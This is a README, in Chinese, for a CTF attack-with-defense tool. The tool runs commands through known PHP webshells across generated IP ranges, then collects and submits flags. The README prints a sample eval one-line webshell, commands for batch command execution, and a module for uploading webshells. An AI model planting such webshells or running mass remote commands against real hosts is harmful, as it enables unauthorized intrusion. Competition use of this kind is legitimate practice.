AWD Predator Framework v1.0                   

              --code by AresX       
			  

在AWD攻防赛中通过给定的webshell批量获取提交flag

## webshell

**添加已知的webshell,仅支持php，GET和POST方法使用eval和exec函数的一句话木马**

### 添加webshell

命令`add`

使用方法: `add [shell path] [pwd] [type(eval/exec)] [method(get/post)]`

如一句话为`<?php @eval($_POST[‘cmd’]);?>` 路径为`x.x.x.x:8001://index/cmd.php`

一句话密码为`cmd` 功能函数为`eval` 方法为`POST`

example:`add x.x.x.x:8001://index/cmd.php cmd eval post`

命令执行后webshell的路径和密码会以字典的形式储存

### 显示添加的webshell

命令`show`

将显示所有添加的webshell路径和密码

### 保存,读取,清空webshell
*保存已经添加的webshell路径和密码，方便临场修改代码*

保存:`save`
读取:`load`
清空:`clear` //清空不会清空已经储存的webshell,除非在清空后执行保存命令


## iplist

**根据输入生成指定段的ip列表**

### 生成列表

命令: `ip x.x.a-b.x`

可设定acb任意段的ip列表,使用'-'连接左右区间

### 添加指定ip

命令: `ip x.x.x.x`

执行命令后,`x.x.x.x`将被添加到ip列表中,会自动去除重复项和进行排序

### 查看已经生成的列表

命令: `showip`

显示生成的ip列表

## flag

**通过iplist和webshell获取flag，将获取到的flag提交到指定服务器**

### 获取flag
*遍历iplist中所有的地址尝试通过所有已经添加的webshell获取flag,在执行此命令前需设定iplist，否则报错*

命令:`getflag [command]`

example:`getflag curl www.baidu.com/flag.txt`

获取命令如果不需要修改只需完整输入一次，之后可直接执行`getflag`

### 提交flag


*提交flag 需设定提交flag的链接，以及cookie和data,使用"?"替换flag在data中所在的参数*

命令: `submit [url] [cookie] [data](use '?' replace the flag )`

example: `submit http:xxx.xxx.xx/xx/ JSESSIONID=A6F8;route=6cf03 pid=-1&pidName=&flag=?`

提交命令如果不需要修改只需完整输入一次，之后可直接执行`submit`



```
###########
├── Readme.md               //帮助文档 
├── console.py              //启动
├── core                    // 核心模块
│   ├── shells.py           //写入，读取，保存webshell
│   ├── flag.py             // 获取，提交flag
│   ├── iplist.py           // 生成ip列表   
│—— auxi                    //辅助模块
|   |—— upload.py           //webshell上传功能
|
```